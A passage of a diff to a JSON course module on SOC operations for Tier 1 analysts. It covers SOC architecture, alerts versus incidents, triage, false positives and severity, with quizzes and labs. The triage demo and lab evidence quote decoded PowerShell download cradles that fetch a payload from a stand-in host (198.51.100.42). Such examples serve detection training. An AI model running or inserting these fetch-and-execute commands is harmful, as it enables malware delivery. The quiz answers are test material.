@@ -1,82 +1,97 @@
 {
   "moduleId": "04",
   "title": "SOC Operations",
+  "description": "Master foundational SOC operational procedures: architecture, alerts vs events, alert triage, false positive elimination, severity classification, tiered escalation, and audit-grade documentation.",
   "topics": [
     {
       "id": "topic-1",
       "title": "SOC Architecture",
       "order": 1,
-      "description": "Understand how a Security Operations Center is structured",
+      "description": "Understand the three pillars (People, Process, Technology) and how telemetry flows through ingestion pipelines.",
       "units": [
         {
           "id": "unit-1-1",
           "type": "THEORY",
-          "title": "What is SOC Architecture?",
+          "title": "Topic 1: People, Process & Technology",
           "order": 1,
           "content": {
-            "text": "A Security Operations Center (SOC) is built on three fundamental pillars: People, Process, and Technology. Understanding how these elements work together is essential for effective security operations.",
-            "subtitle": "The foundation of modern security operations",
+            "text": "A Security Operations Center (SOC) is built on three interdependent pillars: People, Process, and Technology. Skilled analysts (People) execute repeatable Standard Operating Procedures (Process) using advanced monitoring platforms (Technology) to defend the enterprise.",
+            "subtitle": "The Three Foundational Pillars of Modern Security Operations",
             "visual": {
               "type": "diagram",
               "component": "SocArchitectureDiagram"
             },
             "techBox": {
-              "title": "SOC Components",
-              "content": "People: Analysts, Engineers, Managers\nProcess: Workflows, Procedures, Playbooks\nTechnology: SIEM, EDR, NDR, Firewalls, IDS/IPS\nData: Logs, Alerts, Threat Intelligence"
+              "title": "The Three SOC Pillars",
+              "content": "• People: Tier 1 (Triage), Tier 2 (Incident Response), Tier 3 (Threat Hunting / Malware Analysis), SOC Lead, CISO\n• Process: Standard Operating Procedures (SOPs), Triage Playbooks, Escalation Matrices, SLA Standards\n• Technology: SIEM (Correlation), EDR (Endpoint Telemetry), NDR (Network Inspection), SOAR (Automation), Firewalls"
             },
             "knowMore": {
-              "title": "Modern SOC Evolution",
-              "content": "Modern SOCs have evolved from simple monitoring centers to advanced threat hunting and incident response operations. Today's SOCs leverage automation, AI, and threat intelligence to stay ahead of sophisticated attacks."
+              "title": "NIST SP 800-61 Incident Handling Architecture",
+              "content": "NIST emphasizes that buying security tools without disciplined processes and trained staff creates blind spots and alert fatigue."
             }
           },
-          "estimatedMinutes": 8,
+          "estimatedMinutes": 10,
           "xpReward": 50
         },
         {
           "id": "unit-1-2",
-          "type": "DEMO",
-          "title": "SOC Data Flow",
+          "type": "THEORY",
+          "title": "Topic 2: SOC Data Flow & Ingestion Pipeline",
           "order": 2,
           "content": {
+            "text": "Telemetry flows across five sequential stages: Event Generation on endpoints and network devices, Forwarding via secure TLS shippers, Centralized Parsing and Normalization into standard schemas (CIM/OSSEM), Correlation Rule Evaluation in the SIEM, and Presentation in the Analyst Triage Queue.",
+            "subtitle": "Tracing Security Telemetry from Host to Analyst Queue",
+            "visual": {
+              "type": "flow",
+              "component": "SiemArchitectureDiagram"
+            },
+            "techBox": {
+              "title": "Pipeline Stages",
+              "content": "1. Endpoint Log Generation (Windows EVTX, Sysmon, Linux Syslog)\n2. Transport (Universal Forwarder, TCP 9997 / TLS 514)\n3. Normalization (Common Information Model field extraction)\n4. Correlation (Scheduled SPL/KQL searches trigger on threat logic)\n5. Alert Queue (Analyst claims ticket for triage within SLA)"
+            }
+          },
+          "estimatedMinutes": 8,
+          "xpReward": 35
+        },
+        {
+          "id": "unit-1-3",
+          "type": "DEMO",
+          "title": "Topic 3: [Demo] SOC Architecture & Data Flow",
+          "order": 3,
+          "content": {
             "demo": {
-              "title": "How Data Flows Through a SOC",
-              "description": "Watch how security data moves from collection to analyst action",
+              "title": "Interactive SOC Architecture Walkthrough",
+              "description": "Watch a live security event travel through Universal Forwarders, Indexers, and Search Heads to reach the Tier 1 triage console.",
               "steps": [
                 {
                   "order": 1,
-                  "title": "Data Collection",
-                  "description": "Security devices and systems generate logs and telemetry",
-                  "highlight": "Firewalls, endpoints, servers, and applications constantly generate security data"
+                  "title": "Log Generation",
+                  "description": "Workstation FIN-WS-09 records Event ID 4688 (Process Creation).",
+                  "highlight": "Raw Windows security event captured locally in EVTX format."
                 },
                 {
                   "order": 2,
-                  "title": "Centralization",
-                  "description": "Data flows into the SIEM for storage and correlation",
-                  "highlight": "The SIEM acts as the central nervous system of the SOC"
+                  "title": "Forwarder Transmission",
+                  "description": "Log shipper compresses and transmits data across port 9997 over TLS.",
+                  "highlight": "Forwarders guarantee log delivery and prevent endpoint tampering."
                 },
                 {
                   "order": 3,
-                  "title": "Detection",
-                  "description": "Rules and analytics detect suspicious patterns",
-                  "highlight": "Automated detection rules trigger when conditions are met"
+                  "title": "Parsing & Indexing",
+                  "description": "Indexer extracts user, process, and IP into normalized schema fields.",
+                  "highlight": "Normalization enables uniform detection rules across Windows and Linux."
                 },
                 {
                   "order": 4,
-                  "title": "Alert Generation",
-                  "description": "Alerts are created and prioritized for analyst review",
-                  "highlight": "Not all detections become alerts - filtering reduces noise"
-                },
-                {
-                  "order": 5,
-                  "title": "Analyst Investigation",
-                  "description": "L1 analysts triage and investigate alerts",
-                  "highlight": "This is where you come in as a SOC Analyst L1"
+                  "title": "Alert Triggered",
+                  "description": "Correlation rule detects encoded script execution and creates ticket ALT-101.",
+                  "highlight": "SIEM rule distills millions of events into one high-priority alert."
                 }
               ],
-              "conclusion": "Understanding this flow helps you see how your work fits into the bigger picture."
+              "conclusion": "Understanding the data flow enables analysts to quickly diagnose log ingestion delays or forwarder blind spots."
             }
           },
-          "estimatedMinutes": 5,
+          "estimatedMinutes": 6,
           "xpReward": 25
         }
       ],
@@ -87,15 +102,15 @@
           "type": "MULTIPLE_CHOICE",
           "order": 1,
           "question": {
-            "text": "What are the three fundamental pillars of SOC architecture?",
+            "text": "What are the three core foundational pillars that support any enterprise Security Operations Center?",
             "options": [
+              "Hardware, Software, Firmware",
               "People, Process, Technology",
-              "Detection, Response, Recovery",
-              "Prevention, Detection, Correction",
-              "Monitoring, Analysis, Reporting"
+              "Firewalls, Antivirus, SIEM",
+              "Detection, Response, Recovery"
             ],
             "correctAnswer": "People, Process, Technology",
-            "explanation": "SOC architecture is built on three pillars: People (the analysts and teams), Process (the workflows and procedures), and Technology (the tools and systems used)."
+            "explanation": "SOC architecture is built upon People (analysts), Process (SOPs and playbooks), and Technology (monitoring tools)."
           },
           "xpReward": 25
         }
@@ -105,79 +120,59 @@
       "id": "topic-2",
       "title": "Alerts & Events",
       "order": 2,
-      "description": "Learn the difference between events, alerts, incidents, and cases",
+      "description": "Learn the operational taxonomy separating raw log Events from SIEM Alerts, qualified Incidents, and legal Cases.",
       "units": [
         {
           "id": "unit-2-1",
           "type": "THEORY",
-          "title": "Understanding Security Events",
+          "title": "Topic 1: Events vs. Alerts",
           "order": 1,
           "content": {
-            "text": "Not everything that happens in your environment is a security incident. Understanding the hierarchy from events to cases is crucial for effective SOC operations.",
-            "subtitle": "From raw data to actionable intelligence",
-            "visual": {
-              "type": "flow",
-              "component": "EventToIncidentFlow"
-            },
+            "text": "An Event is any observable technical occurrence on a host or network (e.g. user login, packet drop, DHCP lease). An Alert is a signal generated when an event (or sequence of events) satisfies a predefined detection rule or statistical threshold indicating potential threat activity.",
+            "subtitle": "Distinguishing Background Telemetry from Actionable Signals",
             "techBox": {
-              "title": "The Security Hierarchy",
-              "content": "Event: Any recorded activity (login, file access, network connection)\nAlert: An event that matches a detection rule\nIncident: A confirmed security issue requiring response\nCase: A documented investigation with evidence and actions"
-            },
-            "realWorldExample": "Imagine your home security camera (events) detecting motion (alert). You investigate and confirm someone is actually breaking in (incident). You call the police and document everything that happened (case)."
+              "title": "Volume Reduction Funnel",
+              "content": "• 10,000,000 Events per day (Raw logs, 99.9% benign background noise)\n• 1,000 Alerts per day (Rule matches evaluated by Tier 1 analysts)\n• 50 Incidents per day (Confirmed malicious threats requiring containment)\n• 5 Cases per day (Formal investigation containers tracking remediation & audit evidence)"
+            }
           },
-          "estimatedMinutes": 7,
-          "xpReward": 50
+          "estimatedMinutes": 8,
+          "xpReward": 40
         },
         {
           "id": "unit-2-2",
           "type": "THEORY",
-          "title": "Event Volume vs Alert Volume",
+          "title": "Topic 2: Incidents vs. Cases",
           "order": 2,
           "content": {
-            "text": "A typical enterprise generates millions of events per day, but only a small fraction become alerts. This filtering is essential to prevent analyst overwhelm.",
-            "subtitle": "Why we don't investigate everything",
-            "visual": {
-              "type": "funnel",
-              "component": "EventFilteringFunnel"
-            },
+            "text": "An Alert becomes a Security Incident once an analyst investigates and confirms that unauthorized, malicious, or policy-violating activity has occurred. A Case is the formal organizational and legal folder that documents evidence, timeline, actions taken, and post-incident remediation.",
+            "subtitle": "From Technical Confirmation to Legal Chain of Custody",
             "techBox": {
-              "title": "Typical Volume Reduction",
-              "content": "Events per day: ~10,000,000\nAlerts per day: ~10,000 (99.9% filtered)\nIncidents per day: ~100 (99% are false positives)\nCases per day: ~10 (90% handled by L1)"
+              "title": "Case Management Requirements",
+              "content": "• Unique Case ID (e.g. INC-2026-042)\n• Asset & Identity inventory\n• SHA-256 hashes of malware artifacts\n• Chronological UTC investigation timeline\n• Assigned responder and regulatory notification clock"
             }
           },
-          "estimatedMinutes": 5,
-          "xpReward": 25
+          "estimatedMinutes": 8,
+          "xpReward": 40
         }
       ],
       "knowledgeChecks": [
         {
           "id": "kc-2-1",
-          "title": "Events, Alerts, and Incidents",
-          "type": "MATCHING",
+          "title": "Events, Alerts, Incidents, and Cases",
+          "type": "MULTIPLE_CHOICE",
           "order": 1,
           "question": {
-            "text": "Match each term to its correct definition:",
-            "pairs": [
-              {
-                "left": "Event",
-                "right": "Any recorded system or security activity"
-              },
-              {
-                "left": "Alert",
-                "right": "An event that matches a detection rule"
-              },
-              {
-                "left": "Incident",
-                "right": "A confirmed security issue requiring response"
-              },
-              {
-                "left": "Case",
-                "right": "A documented investigation with evidence"
-              }
+            "text": "Which of the following describes the difference between an Alert and an Incident?",
+            "options": [
+              "Alerts are always false positives, while incidents are always true positives",
+              "An alert is an unverified notification triggered by a detection rule; an incident is a confirmed security compromise verified by an analyst",
+              "Alerts are created by Tier 3, while incidents are created by Tier 1",
+              "There is no difference; the terms are completely interchangeable"
             ],
-            "explanation": "Understanding this hierarchy is fundamental to SOC operations. Events are raw data, alerts are filtered events, incidents are confirmed issues, and cases are formal investigations."
+            "correctAnswer": "An alert is an unverified notification triggered by a detection rule; an incident is a confirmed security compromise verified by an analyst",
+            "explanation": "Alerts are candidate notifications generated by automated rules; an Incident is officially declared only after human verification confirms an active threat or breach."
           },
-          "xpReward": 30
+          "xpReward": 25
         }
       ]
     },
@@ -185,139 +180,132 @@
       "id": "topic-3",
       "title": "Alert Triage",
       "order": 3,
-      "description": "Master the L1 analyst workflow for investigating alerts",
+      "description": "Master systematic alert triage: understand the alert signature, extract core entities (User, Host, IP), verify evidence, and investigate attacks.",
       "units": [
         {
           "id": "unit-3-1",
           "type": "THEORY",
-          "title": "The Alert Triage Process",
+          "title": "Topic 1: Understand Alert & Identify User, Host & IP",
           "order": 1,
           "content": {
-            "text": "Alert triage is the systematic process of investigating security alerts to determine if they represent real threats. As an L1 analyst, this is your primary responsibility.",
-            "subtitle": "Your daily workflow as a SOC Analyst",
-            "visual": {
-              "type": "workflow",
-              "component": "AlertTriageWorkflow"
-            },
+            "text": "Alert triage begins by understanding what rule triggered and extracting the core investigation entities: User context (privileges, department, shift), Host context (workstation vs domain controller, asset criticality), and IP context (internal RFC 1918 subnet vs external reputation via AbuseIPDB and VirusTotal).",
+            "subtitle": "The Three Foundational Entities of Security Triage",
             "techBox": {
-              "title": "The Standard Triage Workflow",
-              "content": "1. Understand the Alert - What detection rule triggered?\n2. Identify the User - Who is involved?\n3. Identify the Host - What system is affected?\n4. Identify the IP - What network activity occurred?\n5. Check Evidence - Review logs and telemetry\n6. Make Decision - True positive, false positive, or escalate?"
+              "title": "Entity Extraction Checklist",
+              "content": "1. Alert Rule: MITRE technique, signature logic, trigger threshold\n2. User Entity: Account name, domain group, active shift, HR status\n3. Host Entity: Hostname, IP address, OS build, business criticality\n4. IP Entity: Source vs Destination, internal vs external, Threat Intel reputation"
             }
           },
           "estimatedMinutes": 10,
-          "xpReward": 75
+          "xpReward": 50
         },
         {
           "id": "unit-3-2",
-          "type": "INTERACTIVE",
-          "title": "FinCorp Alert: Failed Login Attempts",
+          "type": "THEORY",
+          "title": "Topic 2: Check Evidence & Process Lineage",
           "order": 2,
           "content": {
-            "interactive": {
-              "type": "simulation",
-              "scenario": "fincorp-failed-login",
-              "data": {
-                "alert": {
-                  "title": "Multiple Failed Login Attempts",
-                  "severity": "medium",
-                  "source": "Windows Security",
-                  "timestamp": "2024-01-15 14:32:18",
-                  "description": "10 failed login attempts detected for user Finance01 from IP 192.168.10.45"
-                },
-                "context": {
-                  "user": "Finance01",
-                  "host": "FIN-PC-04",
-                  "ip": "192.168.10.45",
-                  "department": "Finance",
-                  "normalActivity": "User typically logs in once per day between 8-9 AM"
-                },
-                "questions": [
-                  {
-                    "question": "What is the first thing you should check?",
-                    "options": [
-                      "Who is Finance01?",
-                      "Block the IP immediately",
-                      "Call the user",
-                      "Close the alert"
-                    ],
-                    "correct": "Who is Finance01?",
-                    "feedback": "Always start by understanding WHO is involved. Finance01 is Sarah Johnson, a Finance Manager."
-                  },
-                  {
-                    "question": "The failed logins happened at 2:32 PM. What does this tell you?",
-                    "options": [
-                      "Nothing - time doesn't matter",
-                      "Outside normal login hours",
-                      "Normal login time",
-                      "It's definitely malicious"
-                    ],
-                    "correct": "Outside normal login hours",
-                    "feedback": "Sarah normally logs in between 8-9 AM. Activity at 2:32 PM is unusual and worth investigating."
-                  },
-                  {
-                    "question": "What should you do next?",
-                    "options": [
-                      "Immediately disable the account",
-                      "Check if there were any successful logins",
-                      "Ignore - it's just 10 attempts",
-                      "Call IT to reboot the server"
-                    ],
-                    "correct": "Check if there were any successful logins",
-                    "feedback": "Correct! Check if any login succeeded after the failures. This could indicate a successful brute force attack."
-                  }
-                ]
-              }
+            "text": "Verifying evidence requires inspecting process lineage: checking parent-child relationships (e.g. WINWORD.EXE spawning powershell.exe is a high-confidence attack indicator), de-obfuscating Base64 command lines, verifying SHA-256 binary hashes, and checking network flow egress.",
+            "subtitle": "Corroborating Telemetry across Host and Perimeter Sensors",
+            "techBox": {
+              "title": "High-Risk Parent-Child Indicators",
+              "content": "• WINWORD.EXE / EXCEL.EXE -> powershell.exe / cmd.exe\n• w3wp.exe (IIS Web Server) -> cmd.exe / whoami.exe\n• explorer.exe -> rundll32.exe (without command line flags)\n• svchost.exe spawned by any parent other than services.exe"
             }
           },
-          "estimatedMinutes": 12,
-          "xpReward": 100
+          "estimatedMinutes": 8,
+          "xpReward": 40
         },
         {
           "id": "unit-3-3",
-          "type": "THEORY",
-          "title": "Key Questions to Ask",
+          "type": "DEMO",
+          "title": "Topic 3: [Demo] Alert Triage Workflow",
           "order": 3,
           "content": {
-            "text": "Every alert investigation should answer specific questions. These questions guide your thinking and ensure you don't miss critical details.",
-            "subtitle": "The analyst's mental checklist",
-            "visual": {
-              "type": "checklist",
-              "component": "TriageQuestions"
-            },
-            "techBox": {
-              "title": "The 5 W's of Alert Triage",
-              "content": "WHO: Which user/account is involved?\nWHAT: What activity triggered the alert?\nWHEN: When did this occur? Is timing suspicious?\nWHERE: Which system/network location?\nWHY: Why did the detection rule trigger?"
+            "demo": {
+              "title": "Deconstructing an Encoded Script Alert",
+              "description": "Watch a Tier 1 analyst extract entities, decode Base64 arguments, and corroborate egress traffic to verify an active attack.",
+              "steps": [
+                {
+                  "order": 1,
+                  "title": "Alert Inspection",
+                  "description": "Review rule: Suspicious PowerShell Execution with Encoded Arguments on FIN-WS-09.",
+                  "highlight": "Identifies MITRE ATT&CK technique T1059.001."
+                },
+                {
+                  "order": 2,
+                  "title": "Entity Extraction",
+                  "description": "Extract User CORP\\jdoe (Finance clerk) and Host FIN-WS-09 (Finance subnet).",
+                  "highlight": "Non-technical employee running administrative script is highly anomalous."
+                },
+                {
+                  "order": 3,
+                  "title": "Evidence Decoding",
+                  "description": "CyberChef decodes command: WebClient.DownloadString('http://198.51.100.42/staged.ps1').",
+                  "highlight": "Confirms attacker download cradle targeting external C2."
+                },
+                {
+                  "order": 4,
+                  "title": "Egress Corroboration",
+                  "description": "Firewall logs confirm 84KB download from 198.51.100.42 followed by persistent beaconing.",
+                  "highlight": "Multi-source evidence confirms True Positive threat."
+                }
+              ],
+              "conclusion": "Entity extraction and evidence corroboration transform an alert into an undeniable intrusion proof."
             }
           },
           "estimatedMinutes": 6,
-          "xpReward": 50
+          "xpReward": 30
+        },
+        {
+          "id": "unit-3-4",
+          "type": "INTERACTIVE",
+          "title": "Topic 4: [Lab] 🔵 Basic Alert Triage",
+          "order": 4,
+          "content": {
+            "interactive": {
+              "title": "Triage Alert: Suspicious PowerShell on Workstation WS-0492",
+              "scenario": "An alert fired in your queue: 'PowerShell Download Cradle via Office Macro'. Inspect the telemetry artifacts and determine the triage verdict.",
+              "evidence": [
+                {
+                  "label": "Process Tree (Sysmon)",
+                  "detail": "WINWORD.EXE (PID 4012) -> cmd.exe (PID 5120) -> powershell.exe -enc SQBFAFgA... (PID 5892)"
+                },
+                {
+                  "label": "Decoded Arguments",
+                  "detail": "IEX(New-Object Net.WebClient).DownloadFile('http://198.51.100.42/agent.exe', 'C:\\Users\\Public\\agent.exe')"
+                },
+                {
+                  "label": "External IP Reputation",
+                  "detail": "198.51.100.42 flagged on 52 VirusTotal engines as active Cobalt Strike C2 server."
+                },
+                {
+                  "label": "File Hash (SHA256)",
+                  "detail": "agent.exe hash matches Emotet banking trojan dropper."
+                }
+              ]
+            }
+          },
+          "estimatedMinutes": 12,
+          "xpReward": 60
         }
       ],
       "knowledgeChecks": [
         {
           "id": "kc-3-1",
-          "title": "Alert Triage Steps",
-          "type": "ORDERING",
+          "title": "Alert Triage Methodology",
+          "type": "MULTIPLE_CHOICE",
           "order": 1,
           "question": {
-            "text": "Put these alert triage steps in the correct order:",
-            "items": [
-              "Understand the Alert",
-              "Identify the User",
-              "Identify the Host",
-              "Check Evidence",
-              "Make Decision"
+            "text": "When triaging a process execution alert, why is it critical to examine the parent process (Parent PID/Image)?",
+            "options": [
+              "Parent processes determine the color scheme of the terminal",
+              "Legitimate tools like powershell.exe are benign on their own, but being spawned by an Office macro (WINWORD.EXE) reveals an initial access compromise",
+              "Parent processes only exist on Linux systems, not Windows",
+              "The parent process always runs faster than the child process"
             ],
-            "correctAnswer": [
-              0,
-              1,
-              2,
-              3,
-              4
-            ],
-            "explanation": "The correct order ensures you systematically gather all necessary information before making a decision. Always understand what you're looking at first, then gather context about who and what is involved, review evidence, and finally make an informed decision."
+            "correctAnswer": "Legitimate tools like powershell.exe are benign on their own, but being spawned by an Office macro (WINWORD.EXE) reveals an initial access compromise",
+            "explanation": "Attackers abuse living-off-the-land tools like PowerShell; examining the parent process exposes abnormal execution chains like Office macros spawning shell environments."
           },
-          "xpReward": 35
+          "xpReward": 25
         }
       ]
     },
@@ -325,241 +313,218 @@
       "id": "topic-4",
       "title": "False Positives",
       "order": 4,
-      "description": "Learn to identify and handle false positive alerts",
+      "description": "Differentiate malicious intrusions from expected administrative activity, benign software behavior, and SIEM detection errors.",
       "units": [
         {
           "id": "unit-4-1",
           "type": "THEORY",
-          "title": "What is a False Positive?",
+          "title": "Topic 1: Expected Activity & Benign Behavior",
           "order": 1,
           "content": {
-            "text": "A false positive is an alert triggered by legitimate, authorized activity that matches a detection rule. Understanding false positives is crucial because they make up 90-95% of all alerts in a typical SOC.",
-            "subtitle": "The most common challenge in SOC operations",
-            "visual": {
-              "type": "diagram",
-              "component": "FalsePositiveDiagram"
-            },
+            "text": "A False Positive (FP) occurs when a detection rule triggers on authorized or benign behavior. Expected Activity includes scheduled IT tasks: vulnerability scanners (Nessus/Qualys), backup jobs (Veeam), software deployment (SCCM/Intune), and approved penetration tests. Benign Behavior includes sysadmins legitimately using administrative utilities (PsExec, certutil, PowerShell).",
+            "subtitle": "Distinguishing Administrative Operations from Adversary Tactics",
             "techBox": {
-              "title": "Types of False Positives",
-              "content": "Expected Activity: Scheduled scans, backups, updates\nBenign Activity: Normal business processes that look suspicious\nDetection Errors: Rules that are too sensitive or poorly tuned\nLegitimate Admin Activity: IT operations that trigger security alerts"
-            },
-            "realWorldExample": "Your security system detects 'suspicious network scanning'. Investigation reveals it's the IT team's weekly vulnerability scanner - completely authorized and expected."
+              "title": "Verification Techniques for Expected Activity",
+              "content": "• Check Change Management (ServiceNow CHG tickets for maintenance windows)\n• Check Asset Classification (Privileged Access Workstations vs standard endpoints)\n• Check User Role (Is user an authorized senior sysadmin or a finance clerk?)\n• Check Binary Hash (Does binary match authentic Microsoft signed binary?)"
+            }
           },
           "estimatedMinutes": 8,
-          "xpReward": 50
+          "xpReward": 40
         },
         {
           "id": "unit-4-2",
           "type": "THEORY",
-          "title": "Recognizing False Positives",
+          "title": "Topic 2: Detection Errors & SIEM Rule Tuning",
           "order": 2,
           "content": {
-            "text": "Experienced analysts develop pattern recognition for false positives. Here are key indicators that an alert might be a false positive.",
-            "subtitle": "Signs you're looking at authorized activity",
-            "visual": {
-              "type": "decision-tree",
-              "component": "FalsePositiveDecisionTree"
-            },
+            "text": "Detection Errors happen when SIEM correlation rules are written with overly broad regular expressions or low statistical thresholds. When rules fire indiscriminately, they cause alert fatigue. Tier 1 analysts must report flawed rules to Tier 3 detection engineers with precise narrow exclusions (e.g. filter by known Parent PID, specific signer certificates, or dedicated management subnets).",
+            "subtitle": "The Continuous Feedback Loop Between Triage and Detection Engineering",
             "techBox": {
-              "title": "False Positive Indicators",
-              "content": "✓ Activity matches known scheduled tasks\n✓ Source is an approved service account\n✓ Occurs during maintenance windows\n✓ Pattern matches normal business operations\n✓ User confirms they performed the action\n✓ Activity is part of documented process"
-            },
-            "knowMore": {
-              "title": "The Cost of False Positives",
-              "content": "High false positive rates lead to alert fatigue, where analysts become desensitized to alerts. This is dangerous because it increases the chance of missing real threats. Continuous tuning and feedback loops are essential to reduce false positives."
+              "title": "Tuning Feedback Requirements",
+              "content": "• SIEM Rule ID & Name\n• Raw event payload demonstrating false trigger\n• Documented business justification (approved IT script)\n• Recommended narrow exclusion filter (e.g. ParentImage=CcmExec.exe)"
             }
           },
-          "estimatedMinutes": 7,
-          "xpReward": 50
+          "estimatedMinutes": 8,
+          "xpReward": 40
         },
         {
           "id": "unit-4-3",
           "type": "INTERACTIVE",
-          "title": "False Positive Practice",
+          "title": "Topic 3: [Lab] 🔵 False-Positive Identification",
           "order": 3,
           "content": {
             "interactive": {
-              "type": "classification",
-              "data": {
-                "title": "Classify These Alerts",
-                "scenarios": [
-                  {
-                    "id": 1,
-                    "alert": "Port scan detected from IT-SCANNER-01",
-                    "details": "Weekly vulnerability scan scheduled for Sundays at 2 AM",
-                    "correctAnswer": "false-positive",
-                    "explanation": "This is expected, authorized activity from an approved scanner."
-                  },
-                  {
-                    "id": 2,
-                    "alert": "Multiple failed logins from external IP",
-                    "details": "100+ attempts from IP in Russia, user never logged in successfully",
-                    "correctAnswer": "true-positive",
-                    "explanation": "External brute force attempt - definitely suspicious and requires investigation."
-                  },
-                  {
-                    "id": 3,
-                    "alert": "Unusual data transfer volume",
-                    "details": "User in Marketing uploaded 50GB to cloud storage at 3 PM",
-                    "correctAnswer": "investigate",
-                    "explanation": "Could be legitimate work, but unusual volume warrants verification with the user."
-                  }
-                ]
-              }
+              "title": "Classify 4 Telemetry Detections",
+              "scenario": "Evaluate four triggered alerts against change records and host context to determine whether each is a True Positive or False Positive.",
+              "evidence": [
+                {
+                  "label": "Alert 1: Certutil Download",
+                  "detail": "certutil -urlcache used by senior admin on IT-PAW-01. Change ticket CHG-401 approved for root CA update. Verdict: False Positive."
+                },
+                {
+                  "label": "Alert 2: Rapid Network Sweep",
+                  "detail": "10,000 SYN packets from 10.0.99.10 across internal subnets. Source IP matches corporate Nessus vulnerability scanner. Verdict: False Positive."
+                },
+                {
+                  "label": "Alert 3: Macro Spawning PowerShell",
+                  "detail": "Word doc in Accounting downloads executable from foreign VPS into C:\\Users\\Public. Verdict: True Positive."
+                },
+                {
+                  "label": "Alert 4: Slack MSI Install",
+                  "detail": "SCCM agent (CcmExec.exe) deploying approved enterprise Slack update to 500 laptops. Verdict: False Positive."
+                }
+              ]
             }
           },
-          "estimatedMinutes": 10,
-          "xpReward": 75
+          "estimatedMinutes": 12,
+          "xpReward": 60
         }
       ],
       "knowledgeChecks": [
         {
           "id": "kc-4-1",
           "title": "False Positive Identification",
-          "type": "MULTIPLE_SELECT",
+          "type": "MULTIPLE_CHOICE",
           "order": 1,
           "question": {
-            "text": "Which of these are indicators that an alert might be a false positive? (Select all that apply)",
+            "text": "What is the most reliable way to verify if an alert on administrative tools (e.g. PsExec or Certutil) is expected activity?",
             "options": [
-              "Activity matches a scheduled maintenance window",
-              "Source is from an unknown external IP",
-              "User confirms they performed the action",
-              "Activity involves a service account doing its job",
-              "Multiple users report similar alerts at the same time"
+              "Ask the user casually over chat if they remember doing it",
+              "Cross-reference the activity against approved Change Management tickets (CHG#) and verified maintenance windows",
+              "Assume that any action performed by an IT administrator is always safe",
+              "Ignore the alert and wait to see if the user complains"
             ],
-            "correctAnswer": [
-              "Activity matches a scheduled maintenance window",
-              "User confirms they performed the action",
-              "Activity involves a service account doing its job"
-            ],
-            "explanation": "Scheduled maintenance, user confirmation, and normal service account activity are all strong indicators of false positives. External IPs and multiple similar alerts could indicate real threats."
+            "correctAnswer": "Cross-reference the activity against approved Change Management tickets (CHG#) and verified maintenance windows",
+            "explanation": "Authorized administrative actions must correspond to approved Change Management records (ITSM tickets) specifying maintenance windows and designated systems."
           },
-          "xpReward": 40
+          "xpReward": 25
         }
       ]
     },
     {
       "id": "topic-5",
-      "title": "Severity Classification",
+      "title": "Severity",
       "order": 5,
-      "description": "Learn to assess and classify the severity of security incidents",
+      "description": "Classify incident severity (Low, Medium, High, Critical) using asset impact, attacker progress, evidence confidence, and SLA timers.",
       "units": [
         {
           "id": "unit-5-1",
           "type": "THEORY",
-          "title": "Understanding Severity Levels",
+          "title": "Topic 1: Severity Scale: Low, Medium, High & Critical",
           "order": 1,
           "content": {
-            "text": "Severity classification helps prioritize alerts and incidents. Not all security issues are equally urgent - proper classification ensures critical threats get immediate attention.",
-            "subtitle": "Prioritizing your response",
-            "visual": {
-              "type": "matrix",
-              "component": "SeverityMatrix"
-            },
+            "text": "Severity defines operational urgency, resource allocation, and response deadlines. Critical (P1) represents enterprise-wide ransomware or domain controller compromise with a 15-minute response SLA. High (P2) covers single-system malware execution or compromised privileged accounts with a 1-hour SLA. Medium (P3) represents isolated suspicious anomalies with a 4-hour SLA. Low (P4) covers minor hygiene and policy violations with a 24-hour SLA.",
+            "subtitle": "Service Level Agreements (SLAs) and Operational Prioritization",
             "techBox": {
-              "title": "Standard Severity Levels",
-              "content": "CRITICAL: Active breach, data exfiltration, ransomware\nHIGH: Successful compromise, privilege escalation, malware\nMEDIUM: Suspicious activity, potential compromise, policy violations\nLOW: Minor policy violations, informational alerts, false positives"
+              "title": "SLA Matrix by Severity",
+              "content": "• Critical (P1): 15-min response | 24/7 immediate callout | Active ransomware or DC breach\n• High (P2): 1-hour response | Active C2 or compromised privileged account\n• Medium (P3): 4-hour response | Isolated suspicious script or unauthorized software\n• Low (P4): 24-hour response | Adware, single port scan, minor policy violation"
             }
           },
-          "estimatedMinutes": 8,
+          "estimatedMinutes": 10,
           "xpReward": 50
         },
         {
           "id": "unit-5-2",
           "type": "THEORY",
-          "title": "Impact vs Confidence",
+          "title": "Topic 2: Impact vs. Confidence Scoring",
           "order": 2,
           "content": {
-            "text": "Severity is determined by two factors: potential impact and confidence in the detection. A high-impact event with low confidence might be medium severity, while high impact + high confidence equals critical.",
-            "subtitle": "The two dimensions of severity",
-            "visual": {
-              "type": "matrix",
-              "component": "ImpactConfidenceMatrix"
-            },
+            "text": "Severity is mathematically evaluated using the relationship: Severity = Asset Impact × Evidence Confidence. High Impact on a Tier 0 Crown Jewel (Domain Controller, SWIFT Banking Gateway) with High Confidence (EDR process dump + C2 beaconing) produces an immediate Critical rating. Low Confidence signals require rapid validation before disruptive containment.",
+            "subtitle": "Objective Risk Calculation in Security Triage",
             "techBox": {
-              "title": "Severity Calculation",
-              "content": "Impact: What damage could occur?\n  - Data breach, system compromise, business disruption\nConfidence: How sure are we this is real?\n  - High: Clear evidence of malicious activity\n  - Medium: Suspicious but needs verification\n  - Low: Could be false positive\n\nSeverity = Impact × Confidence"
+              "title": "Scoring Factors",
+              "content": "• Asset Impact: Tier 0 (Crown Jewels: DC, Identity, DB), Tier 1 (Servers), Tier 2 (Endpoints), Tier 3 (Guest Wi-Fi)\n• Evidence Confidence: Low (Single heuristic), Medium (Signature match), High (Corroborated multi-sensor IOCs)"
             }
           },
-          "estimatedMinutes": 7,
-          "xpReward": 50
+          "estimatedMinutes": 8,
+          "xpReward": 40
         },
         {
           "id": "unit-5-3",
-          "type": "INTERACTIVE",
-          "title": "Severity Classification Practice",
+          "type": "DEMO",
+          "title": "Topic 3: [Demo] Severity Evaluation in Action",
           "order": 3,
           "content": {
+            "demo": {
+              "title": "Severity Rating Walkthrough",
+              "description": "Observe how the same Trojan is scored differently depending on whether it affects an isolated test VM, an accounting desktop, or a core domain controller.",
+              "steps": [
+                {
+                  "order": 1,
+                  "title": "Test Sandbox Host",
+                  "description": "Trojan on isolated development test machine: Low severity due to minimal business impact.",
+                  "highlight": "Asset criticality is minimal; no lateral movement possible."
+                },
+                {
+                  "order": 2,
+                  "title": "Corporate Accounting Laptop",
+                  "description": "Same Trojan on domain-joined finance laptop: High severity due to internal corporate network exposure.",
+                  "highlight": "Single-system compromise on corporate domain warrants High priority."
+                },
+                {
+                  "order": 3,
+                  "title": "Primary Domain Controller",
